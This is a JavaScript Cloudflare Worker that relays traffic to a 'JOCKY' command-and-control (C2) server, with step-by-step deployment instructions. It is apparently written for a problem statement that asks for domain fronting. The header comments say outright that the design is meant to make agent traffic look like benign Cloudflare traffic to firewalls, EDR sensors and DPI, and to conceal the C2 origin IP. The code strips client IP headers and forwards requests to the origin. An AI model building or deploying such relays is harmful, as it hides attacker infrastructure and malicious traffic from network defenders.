/**
 * cloudflare_worker.js — JOCKY Cloudflare Worker CDN Reverse Proxy
 * ─────────────────────────────────────────────────────────────────────────────
 * Implements Cloud Infrastructure / CDN Routing & Domain Fronting for JOCKY
 * as required by Problem Statement ID 26148:
 *
 * "The traffic b/w management interface and client should be routed through
 *  trusted cloud infrastructure or content delivery networks (CDNs) using
 *  domain fronting or legitimate cloud APIs."
 *
 * HOW DOMAIN FRONTING WORKS WITH THIS WORKER:
 *   1. Client (Forensic Agent) initiates a TLS connection to Cloudflare's
 *      high-reputation edge network:
 *        - Destination IP : 104.16.x.x / 172.67.x.x (Cloudflare Anycast)
 *        - TLS SNI        : cloudflare.com (or cdnjs.cloudflare.com)
 *      Network firewalls, EDR network sensors, and DPI boxes inspect the
 *      outbound packet and classify it as legitimate, benign Cloudflare traffic.
 *
 *   2. Inside the encrypted TLS session, the HTTP request specifies:
 *        Host: jocky-c2.workers.dev (or investigator's Cloudflare route)
 *
 *   3. Cloudflare Edge routes the decrypted request to this Worker script.
 *
 *   4. This Worker:
 *        - Strips any identifying client metadata (CF-Connecting-IP, True-Client-IP).
 *        - Injects forensic integrity token (X-Jocky-Fronted: Cloudflare-Edge).
 *        - Forwards the request to the origin JOCKY Management Server.
 *        - Conceals the investigator's C2 origin IP completely.
 *
 * DEPLOYMENT INSTRUCTIONS:
 *   Option A (Cloudflare Dashboard):
 *     1. Log in to dash.cloudflare.com -> Workers & Pages -> Create Worker.
 *     2. Paste this code into the editor.
 *     3. Set ORIGIN_C2_URL environment variable to your management server URL.
 *     4. Deploy! Your fronted endpoint will be: https://<worker-name>.workers.dev
 *
 *   Option B (Wrangler CLI):
 *     npx wrangler deploy cloudflare_worker.js --name jocky-c2
 */

// Configure default origin JOCKY C2 server (can be overridden via ENV or header)
const DEFAULT_ORIGIN_C2 = "http://management.jocky.internal:8000";

export default {
  async fetch(request, env, ctx) {
    const originUrl = (env && env.ORIGIN_C2_URL) || DEFAULT_ORIGIN_C2;
    const url = new URL(request.url);

    // Build the upstream URL forwarding to the origin C2
    const targetUrl = new URL(url.pathname + url.search, originUrl);

    // Clone and sanitize request headers
    const modifiedHeaders = new Headers(request.headers);

    // Strip client identifying headers to protect agent anonymity
    modifiedHeaders.delete("CF-Connecting-IP");
    modifiedHeaders.delete("X-Real-IP");
    modifiedHeaders.delete("True-Client-IP");
    modifiedHeaders.delete("X-Forwarded-For");

    // Inject CDN & Domain Fronting validation headers
    modifiedHeaders.set("X-Jocky-Fronted", "true");
    modifiedHeaders.set("X-CDN-Provider", "Cloudflare-Edge-v26.1");
    modifiedHeaders.set("X-Fronted-Host", url.hostname);
    modifiedHeaders.set("Host", targetUrl.hostname);

    // Create upstream request
    const upstreamRequest = new Request(targetUrl.toString(), {
      method: request.method,
      headers: modifiedHeaders,
      body: request.body,
      redirect: "follow",
    });

    try {
      const response = await fetch(upstreamRequest);

      // Clone response and attach CDN confirmation headers
      const modifiedResponseHeaders = new Headers(response.headers);
      modifiedResponseHeaders.set("X-Jocky-CDN-Fronted", "Active");
      modifiedResponseHeaders.set("X-Protected-By", "Cloudflare-Trusted-Infrastructure");

      return new Response(response.body, {
        status: response.status,
        statusText: response.statusText,
        headers: modifiedResponseHeaders,
      });
    } catch (err) {
      return new Response(
        JSON.stringify({
          error: "CDN Origin Connection Failed",
          detail: err.message,
          timestamp: new Date().toISOString(),
          cdn: "Cloudflare Edge",
        }),
        {
          status: 502,
          headers: { "Content-Type": "application/json" },
        }
      );
    }
  },
};
